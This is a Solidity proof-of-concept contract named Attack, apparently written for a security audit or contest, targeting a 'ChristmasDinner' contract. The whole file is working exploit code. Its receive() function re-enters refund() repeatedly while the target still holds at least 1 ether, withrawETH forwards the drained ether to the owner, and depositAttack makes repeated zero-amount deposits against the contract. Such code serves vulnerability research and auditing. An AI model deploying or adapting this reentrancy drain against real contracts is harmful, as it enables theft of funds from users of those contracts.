// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import {IERC20} from "../lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "../lib/openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol";
import {ChristmasDinner} from "src/ChristmasDinner.sol";
import {console2} from "forge-std/Test.sol";

contract Attack {
    using SafeERC20 for IERC20;

    IERC20 public immutable i_WBTC;
    IERC20 public immutable i_WETH;
    IERC20 public immutable i_USDC;
    ChristmasDinner public immutable i_christmasDinner;

    address public owner;

    constructor(
        address _WBTC,
        address _WETH,
        address _USDC,
        address _owner,
        address payable _christmasDinner
    ) {
        owner = _owner;
        i_WBTC = IERC20(_WBTC);
        i_WETH = IERC20(_WETH);
        i_USDC = IERC20(_USDC);
        i_christmasDinner = ChristmasDinner(_christmasDinner);
    }

    receive() external payable {
        console2.log("CD Balance: ", address(i_christmasDinner).balance);
        if (address(i_christmasDinner).balance >= 1e18) {
            i_christmasDinner.refund();
        }
    }

    function doAttack(uint256 _amount) public payable {
        (bool res, ) = address(i_christmasDinner).call{value: _amount}("");
        if (!res) revert("Tx Failed");
        console2.log("Attacking");
        i_christmasDinner.refund();
    }

    function reenterToRefund() public {
        console2.log("Reentring");

        i_christmasDinner.refund();
    }

    function withrawETH() public {
        (bool res, ) = payable(owner).call{value: address(this).balance}("");
        if (!res) revert("Tx Failed");
    }

    function depositAttack(uint256 _amount) public {
        i_WBTC.approve(address(i_christmasDinner), type(uint256).max);
        i_USDC.approve(address(i_christmasDinner), type(uint256).max);
        i_WETH.approve(address(i_christmasDinner), type(uint256).max);
        i_christmasDinner.deposit(address(i_WBTC), 0);
        i_christmasDinner.deposit(address(i_WBTC), 0);
        i_christmasDinner.deposit(address(i_WBTC), _amount);
    }
}
